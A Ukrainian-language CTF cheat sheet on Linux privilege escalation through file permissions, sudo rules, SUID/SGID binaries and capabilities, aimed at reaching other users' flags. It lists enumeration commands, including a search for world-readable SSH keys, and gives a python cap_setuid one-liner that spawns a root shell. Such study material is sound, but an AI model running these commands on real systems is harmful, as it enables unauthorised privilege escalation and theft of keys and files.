# Technique: Linux Permissions / SUID / Capabilities / sudo

**Навіщо:** зрозуміти, які «легальні» механізми дають доступ до чужих файлів чи виконання від іншого юзера. У цьому CTF root не мета, але ці механізми часто дають доступ до прапорців/файлів інших юзерів.
← [post-exploitation](../01-roadmaps/post-exploitation.md) · [lateral-movement](../02-workflows/lateral-movement.md)

---

## Права файлів (швидко)
`-rwxr-x---` = власник(rwx) група(r-x) інші(---). Цікавий випадок — коли поточний юзер потрапляє у «інші/група» з `r` на чужому конфігу/ключі.
```bash
ls -la /home/*/              # що читається у чужих домівках
find / -perm -o+r -path '*/.ssh/*' 2>/dev/null   # світові читабельні ключі
find / -type f -writable 2>/dev/null | grep -vE '^/proc'  # куди пишу
```

## sudo -l (перше, що робити)
```bash
sudo -l
```
| Вивід | Що означає |
|---|---|
| `(root) NOPASSWD: /usr/bin/less /var/log/x` | можеш читати файл від root → з `less` вийти в shell/читати інше |
| `(user2) /path/script` | виконати від user2 → доступ до його файлів |
| `(ALL) ALL` | повний sudo (у цьому CTF навряд, але варто перевірити) |
> Для конкретного бінаря — техніка зловживання на **GTFOBins** (офлайн-копія, [pre-game](../00-setup/pre-game-checklist.md)). Напр. `less`, `vi`, `awk`, `find`, `python` дозволяють запустити shell.

## SUID (виконання з правами власника)
```bash
find / -perm -4000 -type f 2>/dev/null       # SUID
find / -perm -2000 -type f 2>/dev/null       # SGID
```
Незвичайний SUID-бінар (не зі стандартного набору) → GTFOBins → читання/виконання від власника. Стандартні (`passwd`, `mount`, `ping`) зазвичай нецікаві.

## Capabilities (тонші за SUID)
```bash
getcap -r / 2>/dev/null
```
Цікаве: `cap_setuid+ep` на `python/perl` → зміна UID; `cap_dac_read_search` → читання будь-яких файлів.
```bash
# приклад: python з cap_setuid
./python -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

## Як це дає прапорці (без «рута заради рута»)
- `sudo -l` дозволяє прочитати чужий файл → там прапорець/креди.
- SUID/cap бінар читає файл іншого юзера → прапорець.
- Запис у чужий скрипт, який хтось запускає → [cron/services](cron-services.md).

## Читання/пастки
- Не кожен SUID = вектор; звіряй з GTFOBins.
- Без offline GTFOBins — логіка: «бінар уміє читати файл / запускати команду? → те саме відбувається від привілейованого власника».
